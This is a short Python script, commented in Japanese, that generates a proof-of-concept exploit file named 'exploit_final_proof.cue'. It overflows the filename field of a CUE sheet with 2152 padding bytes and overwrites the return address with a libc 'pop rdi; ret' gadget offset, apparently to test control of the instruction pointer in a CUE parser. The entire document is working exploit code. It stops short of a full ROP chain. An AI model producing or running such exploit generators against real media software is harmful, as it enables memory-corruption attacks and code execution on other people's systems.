import struct
import sys

# 1. ターゲットオフセット (NULバイトを含まないアドレス)
# libc.so.6 内の 'pop rdi; ret' のオフセット
OFFSET_POP_RDI_RET = 0x2a205

# 2. パディングの長さ: 2152バイト (0x868)
PADDING_LENGTH = 2152
PADDING = b'A' * PADDING_LENGTH

# 3. 新しいRIPの値 (8バイト)
# NULバイトを含まないオフセットを RIP の値として使用。
# 64bitアドレス (0x000000000002a205) は NULバイトを含むが、
# CUEファイルのパースを中断させないことを期待して、バイナリ形式で挿入
NEW_RIP_BYTES = struct.pack('<Q', OFFSET_POP_RDI_RET)

# 4. クリーンアップ/ジャンプ後のデータ (攻撃チェーンは組まない)
# RIPにジャンプさせた後、プログラムがクラッシュすることを確認する
JUNK_DATA = b'JUNKJUNK' * 4

# 最終的なファイル名ペイロード: パディング + 新しいRIP + 後続データ
PAYLOAD = PADDING + NEW_RIP_BYTES + JUNK_DATA

# 5. CUEファイルの生成
cue_content = b'FILE "' + PAYLOAD + b'" BINARY\nTRACK 01 AUDIO\nINDEX 01 01:00:00\n'
output_filename = 'exploit_final_proof.cue'

try:
    with open(output_filename, 'wb') as f:
        f.write(cue_content)
    print(f"[+] 最終証明用ペイロード '{output_filename}' を生成しました。")
    print(f"[!] ターゲットRIP: {hex(OFFSET_POP_RDI_RET)}")
    print(f"[!] **パース中断**が発生した場合、攻撃は不可能です。")

except Exception as e:
    print(f"[!] ファイル書き込み中にエラーが発生しました: {e}", file=sys.stderr)